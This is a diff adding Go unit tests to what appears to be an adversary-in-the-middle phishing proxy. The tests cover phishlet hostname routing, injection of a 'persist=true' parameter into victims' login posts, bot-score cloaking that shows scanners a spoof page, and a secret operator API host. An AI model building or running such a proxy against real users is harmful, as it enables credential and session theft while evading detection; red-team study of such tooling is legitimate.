@@ -549,3 +549,330 @@ func TestPuppetOverrideResolver_NilPhishlet(t *testing.T) {
 		t.Errorf("expected empty override with nil phishlet, got %q", ctx.PuppetOverride)
 	}
 }
+
+// ---- PhishletRouter ---------------------------------------------------------
+
+type stubHostnameChecker struct{ hosts map[string]bool }
+
+func (s *stubHostnameChecker) Contains(hostname string) bool { return s.hosts[hostname] }
+
+type stubPhishletResolver struct {
+	phishlet *aitm.Phishlet
+	lure     *aitm.Lure
+	err      error
+}
+
+func (s *stubPhishletResolver) ResolveHostname(_, _ string) (*aitm.Phishlet, *aitm.Lure, error) {
+	return s.phishlet, s.lure, s.err
+}
+
+func TestPhishletRouter_KnownHost_ResolvesPhishlet(t *testing.T) {
+	phishlet := &aitm.Phishlet{Name: "microsoft"}
+	lure := &aitm.Lure{ID: "lure-1"}
+	h := &request.PhishletRouter{
+		Hostnames: &stubHostnameChecker{hosts: map[string]bool{"login.phish.example.com": true}},
+		Resolver:  &stubPhishletResolver{phishlet: phishlet, lure: lure},
+		Spoof:     &stubSpoofer{},
+	}
+	ctx := &aitm.ProxyContext{}
+	req := newReq(http.MethodGet, "https://login.phish.example.com/oauth", nil)
+	req.Host = "login.phish.example.com"
+
+	if err := h.Handle(ctx, req); err != nil {
+		t.Fatalf("unexpected error: %v", err)
+	}
+	if ctx.Phishlet != phishlet {
+		t.Error("expected phishlet to be set on context")
+	}
+	if ctx.Lure != lure {
+		t.Error("expected lure to be set on context")
+	}
+}
+
+func TestPhishletRouter_UnknownHost_Spoofs(t *testing.T) {
+	spoofer := &stubSpoofer{}
+	h := &request.PhishletRouter{
+		Hostnames: &stubHostnameChecker{hosts: map[string]bool{}},
+		Resolver:  &stubPhishletResolver{},
+		Spoof:     spoofer,
+	}
+	ctx := &aitm.ProxyContext{ResponseWriter: httptest.NewRecorder()}
+	req := newReq(http.MethodGet, "https://unknown.example.com/", nil)
+	req.Host = "unknown.example.com"
+
+	err := h.Handle(ctx, req)
+	if err != proxy.ErrShortCircuit {
+		t.Fatalf("expected ErrShortCircuit, got %v", err)
+	}
+	if !spoofer.called {
+		t.Error("expected spoofer to be called for unknown host")
+	}
+}
+
+func TestPhishletRouter_ResolverError_ReturnsError(t *testing.T) {
+	h := &request.PhishletRouter{
+		Hostnames: &stubHostnameChecker{hosts: map[string]bool{"login.example.com": true}},
+		Resolver:  &stubPhishletResolver{err: errors.New("not found")},
+		Spoof:     &stubSpoofer{},
+	}
+	ctx := &aitm.ProxyContext{}
+	req := newReq(http.MethodGet, "https://login.example.com/", nil)
+	req.Host = "login.example.com"
+
+	if err := h.Handle(ctx, req); err == nil {
+		t.Fatal("expected error from resolver failure")
+	}
+}
+
+// ---- ForcePostInjector ------------------------------------------------------
+
+func TestForcePostInjector_InjectsParam(t *testing.T) {
+	h := &request.ForcePostInjector{}
+	ctx := &aitm.ProxyContext{
+		Phishlet: &aitm.Phishlet{
+			ForcePosts: []aitm.ForcePost{
+				{
+					Path:   regexp.MustCompile(`^/login$`),
+					Params: []aitm.ForcePostParam{{Key: "persist", Value: "true"}},
+				},
+			},
+		},
+	}
+	body := strings.NewReader("username=victim")
+	req := newReq(http.MethodPost, "https://login.example.com/login", body)
+	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+
+	if err := h.Handle(ctx, req); err != nil {
+		t.Fatalf("unexpected error: %v", err)
+	}
+	modified, _ := io.ReadAll(req.Body)
+	if !strings.Contains(string(modified), "persist=true") {
+		t.Errorf("expected injected param, got %q", string(modified))
+	}
+	if !strings.Contains(string(modified), "username=victim") {
+		t.Errorf("expected original param preserved, got %q", string(modified))
+	}
+}
+
+func TestForcePostInjector_NonPost_Skips(t *testing.T) {
+	h := &request.ForcePostInjector{}
+	ctx := &aitm.ProxyContext{
+		Phishlet: &aitm.Phishlet{
+			ForcePosts: []aitm.ForcePost{
+				{
+					Path:   regexp.MustCompile(`/login`),
+					Params: []aitm.ForcePostParam{{Key: "persist", Value: "true"}},
+				},
+			},
+		},
+	}
+	req := newReq(http.MethodGet, "https://login.example.com/login", nil)
+
+	if err := h.Handle(ctx, req); err != nil {
+		t.Fatalf("unexpected error: %v", err)
+	}
+}
+
+func TestForcePostInjector_PathMismatch_Skips(t *testing.T) {
+	h := &request.ForcePostInjector{}
+	ctx := &aitm.ProxyContext{
+		Phishlet: &aitm.Phishlet{
+			ForcePosts: []aitm.ForcePost{
+				{
+					Path:   regexp.MustCompile(`^/login$`),
+					Params: []aitm.ForcePostParam{{Key: "persist", Value: "true"}},
+				},
+			},
+		},
+	}
+	body := strings.NewReader("username=victim")
+	req := newReq(http.MethodPost, "https://login.example.com/logout", body)
+	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+
+	if err := h.Handle(ctx, req); err != nil {
+		t.Fatalf("unexpected error: %v", err)
+	}
+	result, _ := io.ReadAll(req.Body)
+	if strings.Contains(string(result), "persist") {
+		t.Error("expected no injection when path doesn't match")
+	}
+}
+
+func TestForcePostInjector_ConditionNotMet_Skips(t *testing.T) {
+	h := &request.ForcePostInjector{}
+	ctx := &aitm.ProxyContext{
+		Phishlet: &aitm.Phishlet{
+			ForcePosts: []aitm.ForcePost{
+				{
+					Path: regexp.MustCompile(`^/login$`),
+					Conditions: []aitm.ForcePostCondition{
+						{Key: regexp.MustCompile(`^type$`), Search: regexp.MustCompile(`^oauth$`)},
+					},
+					Params: []aitm.ForcePostParam{{Key: "persist", Value: "true"}},
+				},
+			},
+		},
+	}
+	body := strings.NewReader("type=saml&username=victim")
+	req := newReq(http.MethodPost, "https://login.example.com/login", body)
+	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+
+	if err := h.Handle(ctx, req); err != nil {
+		t.Fatalf("unexpected error: %v", err)
+	}
+	result, _ := io.ReadAll(req.Body)
+	if strings.Contains(string(result), "persist") {
+		t.Error("expected no injection when condition not met")
+	}
+}
+
+func TestForcePostInjector_NilPhishlet_Skips(t *testing.T) {
+	h := &request.ForcePostInjector{}
+	ctx := &aitm.ProxyContext{}
+	req := newReq(http.MethodPost, "https://login.example.com/login", strings.NewReader("x=1"))
+
+	if err := h.Handle(ctx, req); err != nil {
+		t.Fatalf("unexpected error: %v", err)
+	}
+}
+
+// ---- TelemetryScoreCheck ----------------------------------------------------
+
+type stubTelemetryScorer struct{ score float64 }
+
+func (s *stubTelemetryScorer) ScoreSession(_ string) float64 { return s.score }
+
+func TestTelemetryScoreCheck_BelowThreshold_Passes(t *testing.T) {
+	h := &request.TelemetryScoreCheck{
+		Scorer:    &stubTelemetryScorer{score: 0.3},
+		Spoof:     &stubSpoofer{},
+		Threshold: 0.8,
+	}
+	ctx := &aitm.ProxyContext{
+		Session:    &aitm.Session{ID: "sess-1"},
+		BotVerdict: aitm.VerdictAllow,
+	}
+	req := newReq(http.MethodGet, "https://example.com/", nil)
+
+	if err := h.Handle(ctx, req); err != nil {
+		t.Fatalf("unexpected error: %v", err)
+	}
+	if ctx.Session.BotScore != 0.3 {
+		t.Errorf("expected BotScore=0.3, got %f", ctx.Session.BotScore)
+	}
+}
+
+func TestTelemetryScoreCheck_AboveThreshold_Spoofs(t *testing.T) {
+	spoofer := &stubSpoofer{}
+	h := &request.TelemetryScoreCheck{
+		Scorer:    &stubTelemetryScorer{score: 0.95},
+		Spoof:     spoofer,
+		Threshold: 0.8,
+	}
+	ctx := &aitm.ProxyContext{
+		Session:        &aitm.Session{ID: "sess-1"},
+		BotVerdict:     aitm.VerdictAllow,
+		ResponseWriter: httptest.NewRecorder(),
+	}
+	req := newReq(http.MethodGet, "https://example.com/", nil)
+
+	err := h.Handle(ctx, req)
+	if err != proxy.ErrShortCircuit {
+		t.Fatalf("expected ErrShortCircuit, got %v", err)
+	}
+	if !spoofer.called {
+		t.Error("expected spoofer for high bot score")
+	}
+	if ctx.BotVerdict != aitm.VerdictSpoof {
+		t.Errorf("expected VerdictSpoof, got %v", ctx.BotVerdict)
+	}
+}
+
+func TestTelemetryScoreCheck_NilSession_Skips(t *testing.T) {
+	h := &request.TelemetryScoreCheck{
+		Scorer:    &stubTelemetryScorer{score: 0.99},
+		Spoof:     &stubSpoofer{},
+		Threshold: 0.5,
+	}
+	ctx := &aitm.ProxyContext{BotVerdict: aitm.VerdictAllow}
+	req := newReq(http.MethodGet, "https://example.com/", nil)
+
+	if err := h.Handle(ctx, req); err != nil {
+		t.Fatalf("unexpected error: %v", err)
+	}
+}
+
+func TestTelemetryScoreCheck_NonAllowVerdict_Skips(t *testing.T) {
+	h := &request.TelemetryScoreCheck{
+		Scorer:    &stubTelemetryScorer{score: 0.99},
+		Spoof:     &stubSpoofer{},
+		Threshold: 0.5,
+	}
+	ctx := &aitm.ProxyContext{
+		Session:    &aitm.Session{ID: "sess-1"},
+		BotVerdict: aitm.VerdictSpoof, // already spoofed
+	}
+	req := newReq(http.MethodGet, "https://example.com/", nil)
+
+	if err := h.Handle(ctx, req); err != nil {
+		t.Fatalf("unexpected error: %v", err)
+	}
+}
+
+// ---- APIRouter --------------------------------------------------------------
+
+func TestAPIRouter_MatchingHost_DelegatesToHandler(t *testing.T) {
+	handler := &stubSpoofer{}
+	h := &request.APIRouter{
+		SecretHostname: "api-secret.example.com",
+		Handler:        handler,
+	}
+	ctx := &aitm.ProxyContext{ResponseWriter: httptest.NewRecorder()}
+	req := newReq(http.MethodGet, "https://api-secret.example.com/sessions", nil)
+	req.Host = "api-secret.example.com"
+
+	err := h.Handle(ctx, req)
+	if err != proxy.ErrShortCircuit {
+		t.Fatalf("expected ErrShortCircuit, got %v", err)
+	}
+	if !handler.called {
+		t.Error("expected API handler to be called")
+	}
+}
+
+func TestAPIRouter_CaseInsensitiveMatch(t *testing.T) {
+	handler := &stubSpoofer{}
+	h := &request.APIRouter{
+		SecretHostname: "API-Secret.Example.Com",
+		Handler:        handler,
+	}
+	ctx := &aitm.ProxyContext{ResponseWriter: httptest.NewRecorder()}
+	req := newReq(http.MethodGet, "https://api-secret.example.com/sessions", nil)
+	req.Host = "api-secret.example.com"
+
+	err := h.Handle(ctx, req)
+	if err != proxy.ErrShortCircuit {
+		t.Fatalf("expected ErrShortCircuit for case-insensitive match, got %v", err)
+	}
+	if !handler.called {
+		t.Error("expected handler to be called with case-insensitive match")
+	}
+}
+
+func TestAPIRouter_NonMatchingHost_Passes(t *testing.T) {
+	handler := &stubSpoofer{}
+	h := &request.APIRouter{
+		SecretHostname: "api-secret.example.com",
+		Handler:        handler,
+	}
+	ctx := &aitm.ProxyContext{}
+	req := newReq(http.MethodGet, "https://login.phish.example.com/", nil)
+	req.Host = "login.phish.example.com"
+
+	if err := h.Handle(ctx, req); err != nil {
+		t.Fatalf("unexpected error: %v", err)
+	}
+	if handler.called {
+		t.Error("expected API handler NOT to be called for non-matching host")
+	}
+}
